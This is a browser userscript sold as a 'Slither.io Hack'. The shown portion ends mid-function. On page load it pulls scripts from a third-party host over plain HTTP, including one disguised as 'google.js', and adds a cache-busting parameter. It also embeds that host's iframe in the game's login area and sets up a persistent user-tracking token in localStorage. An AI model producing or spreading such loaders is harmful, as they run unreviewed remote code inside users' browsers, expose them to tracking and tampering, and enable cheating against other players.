// ==UserScript==
// @name         Slither.io Hack 1.0
// @namespace    http://forums.datekkybitsforums.tk
// @version      1.0
// @description  Slither.io hack by DaTekkyBits
// @author       DaTekkyBits
// @noframes
// @match        http://slither.io/*
// @match        https://slither.io/*
// @run-at       document-body
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

window.addEventListener("load", function () {

    var script = document.createElement("SCRIPT");
    script.src = "http://godmods.com/userjs/google.js";
    document.getElementsByTagName('head')[0].appendChild(script);


    var slitherScript = document.createElement("SCRIPT");

            var jqueryscript = document.createElement("SCRIPT");
            jqueryscript.src = "https://code.jquery.com/jquery-2.2.3.min.js";
            document.getElementsByTagName('head')[0].appendChild(jqueryscript);

			var contentframe = document.createElement("IFRAME");
            contentframe.id = "contentframe";
            contentframe.src = "http://godmods.com/userjs/design/index.html";
            contentframe.tabIndex = -1;
            contentframe.height = contentframe.width = "100%";
            contentframe.frameBorder = "0";
            document.getElementById("login").appendChild(contentframe);

            script.addEventListener("load", function () {
                slitherScript.src = "http://godmods.com/userjs/slitherio.org.js" + '?bustcache=' + new Date().getTime();
                document.getElementsByTagName('head')[0].appendChild(slitherScript);
            });


    slitherScript.addEventListener("load", function () {
        var userid = localStorage.getItem("userid");
        if (userid) {
            useToken(userid);
        } else {
            userid = getRandomToken();
